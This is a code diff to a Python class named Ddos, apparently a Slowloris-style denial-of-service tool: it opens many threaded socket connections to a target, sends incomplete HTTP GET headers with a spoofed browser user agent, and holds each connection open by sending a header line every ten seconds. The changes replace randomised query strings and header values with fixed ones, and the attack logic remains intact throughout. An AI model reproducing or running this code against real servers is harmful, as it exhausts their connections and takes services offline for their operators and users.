@@ -33,7 +33,7 @@ class Ddos(Thread):
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     sock.settimeout(4)
                     sock.connect((self.ip, self.port))
-                    sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
+                    sock.send(f"GET / HTTP/1.1\r\n".encode("utf-8"))
                     print("pas derreur. threads : ",i)
                     sock.close()
                     error = False
@@ -64,14 +64,14 @@ class Ddos(Thread):
 
                 s.connect((ip, port))
 
-                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
+                s.send(f"GET / HTTP/1.1\r\n".encode("utf-8"))
                 ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
                 s.send(f"User-Agent:{ua}".encode("utf-8"))
                 s.send(f"Accept-language:en-US,en,q=0.5".encode("utf-8"))
                 while self.stop_threads:
                     try:
                         time.sleep(10)
-                        s.send(f"X-a:{random.randint(1, 5000)}".encode("utf-8"))
+                        s.send(f"X-a:1".encode("utf-8"))
                     except socket.error as e:
                         break
             except socket.error as e:
